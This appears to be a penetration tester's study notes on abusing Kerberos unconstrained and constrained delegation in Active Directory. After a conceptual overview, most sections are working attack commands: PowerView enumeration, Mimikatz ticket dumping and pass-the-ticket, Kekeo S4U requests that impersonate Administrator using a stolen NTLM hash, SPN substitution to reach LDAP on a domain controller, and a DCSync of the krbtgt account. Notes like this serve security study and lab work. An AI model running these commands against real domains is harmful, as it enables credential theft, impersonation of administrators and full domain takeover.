# Kerberos Delegation


* kerberos delegation allows one to reuse the enduser credentials to access resources hosted on a different server
* usefull in multi tiered service or applications where kerberos double hop is required
* example, users authenticates to a webserver and webserver makes requests to a db server. the webserver can request access to resources (all or some resources depending on the type of delegation) on the database server as the user and not as the webservers service account. (this example, the service account for the web service must be trusted for delegation to be able to make requests as a user)


<br>

## kerberos delegation workflow

1. user --> DC
   * user provides credentials to the DC

2. DC --> user
   * DC returns a TGT

3. User --> DC
   * user requests a TGS for the web service on the webserver

4. DC --> user
   * DC provides TGS

5. user --> webserver
   * user sends the TGT and TGS to the webserver

6. webserver --> DC
   * webserver service account use the users TGT to request a TGS for the database server from the DC 

7. webserver - DB server
   * webserver service account connects to the db server as the user


<br>

## two types of kerberos delegation

### general / basic / unconstrained delegation

* allows the first hop server (webserver in above example) to request access to any service on any computer in the domain


### constrained delegation

* allows the first hop server (webserver in above example) to request access only to specified services on specified computers. if the user is not using kerberos authentication to authenticate to the first hop server, windows offers Protocol Transition to transition the request to kerberos

* note that in both types of delegations, a mechanism is required to impersonate the imcoming user and authenticate to the second hop server (db server in above example) as the user.


<br>  

## Unconstrained Delegation

* when set for a particular service account, unconstrained delegation allows delegation to any service to any resource on the domain as a user
* whem unconstrained delegation is enabled, the DC places users TGT inside TGS (step 4 in the above workflow). when presented to the server with unconstrained delegation, the TGT is extraged from the TGS and stored in LSASS. this way the server can reuse the users TGT to access any other resource as the user
* this could be used to escalate privileges in case we can compromise the computer with unconstrained delegation and a DA connects to that machine

#### discover domain computers with unconstrained delegation
```powershell
Get-NetComputer -UnConstrained   ## powerview

Get-ADComputer -Filter {TrustedForDelegation -eq $True}   ## AD module
Get-ADUser -Filter {TrustedForDelegation -eq $True}
```

* compromise the servers where unconstrained delegation is enabled
#### command to check if any DA tokens are available
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

* trick or wait for a domain admin to connect a service on appsrv
#### run command again
```powershell
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

#### DA token could be reused
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\someuser1\[x;xxxxxxx]-x-x-xxxxxxxx-Administrator@krbtgt-SUB.DOMAIN.LOCAL.kirbi"'
```


<br>

## Constrained Delegation

* constrained delegation allows access only to specified services on a specified machine
* typical scenario - a user authenticates to a web service without using kerberos and the web service makes requests to a database server to fetch results based on the users authentication

* to impersonate the user, Service for User (S4U), extension is used which provides two extensions
  * Service for User to Self (S4U2self) - allows a service to obtain a forwardable TGS to itself on behalf of a user, with just the user principal name without supplying a password. the service account must have the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION - T2A4D UserAccountControl attribute
 
  * Service for User to Proxy (S4U2proxy) - allows a service to obtain a TGS to a second service on behalf of a user. which second service? this is controlled by msDS-AllowedToDelegateTo attribute. this attribute contains a list of SPNs to which the user tokens can be forwarded


### constrained delegation with protocol transition

1. user --> webserver
   * user authenticates to the webservice (running with service account websvc) using a non-kerberos compatible authentication mechanism

2. webserver --> DC
   * webservice requests a ticket ffrom the Key Distribution Center (KDC) for the users account without supplying a password, as the websvc account

3. DC --> webserver
   * the KDC checks the websvc userAccountControl value for the TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION attribute, and that the users account is not blocked for delegation. if OK it returns a forwardable ticket for the users account (S4U2self)

4. webserver --> DC
   * the service then passes this ticket back to the KDC and requests a service ticket for the CIFS/mssql.sub.domain.local service

5. DC --> webserver
   * the KDC checks the msDS-AllowedToDelegateTo field on the websvc account. if the service is listed, it will return a service ticket for mssql (S4U2Proxy)

6. webserver --> fileserver
   * the webservice can now authenticate to the CIFS on mssql as user using the supplied TGS


* to abuse constrained delegation in the above scenario, we need to have access to the websvc account. if we have access to that account, it is possible to access the services listed in msDS-AllowedToDelegateTo of the websvc account as any user

#### enumerate users and computers with constrained delegation enabled
```powershell
Get-DomainUser -TrustedToAuth   ## powerview-dev
Get-DomainComputer -TrustedToAuth

Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo   ## AD module
```

* plaintext password or ntlm hash required. we already have access to websvcs hash from a previous machine

#### using asktgt from kekeo, we request a TGT (steps 2 and 3 from the example above)
```powershell
kekeo# tgt::ask /user:websvc /domain:sub.domain.local /rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

#### using s4u from kekeo, we request a TGS (steps 4 and 5 from the example above)
```powershell
tgs::s4u /tgt:TGT_websvc@SUB.DOMAIN.LOCAL_krbtgt~sub.domain.local@SUB.DOMAIN.LOCAL.kirbi /user:Administrator@sub.domain.local /service:cifs/mssql.sub.domain.local
```

#### using mimikatz, inject the ticket
```powershell
Invoke-Mimikatz -Command '"kerberos:ptt TGS_Administrator@sub.domain.local@SUB.DOMAIN.LOCAL_cifs~mssql.sub.domain.local@SUB.DOMAIN.LOCAL.kirbi"'

ls \\mssql.sub.domain.local\c$
```


* another issue in kerberos is that the delegation occurs not only for the specified service, but for any service running under the same account. there is no validation for the SPN specified.
* this allows access to many services when the delegation may be for a non-intrusive service

* either plaintext password or ntlm hash required. if we hae access to adminsrv hash

#### using asktgt from kekeo we request a TGT
```powershell
tgt::ask /user:adminsrv$ /domain:sub.domain.local /rc4:xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

#### using s4u from kekeo_one (no SNAME) validation
```powershell
tgs::s4u /tgt:TGT_adminsrv$@SUB.DOMAIN.LOCAL_krbtgt~sub.domain.local@SUB.DOMAIN.LOCAL.kirbi /user:Administrator@sub.domain.local /service:time/dc.sub.domain.LOCAL|ldap/dc.sub.domain.LOCAL
```

#### using mimikatz
```powershell
Invoke-Mimikatz -Command '"kerberos:ptt TGS_Administrator@sub.domain.local@SUB.DOMAIN.LOCAL_ldap~dc.sub.domain.local@SUB.DOMAIN.LOCAL_ALT.kirbi"'

Invoke-Mimikatz -Command '"lsadump::dcsync /user:server\krbtgt"'
```










































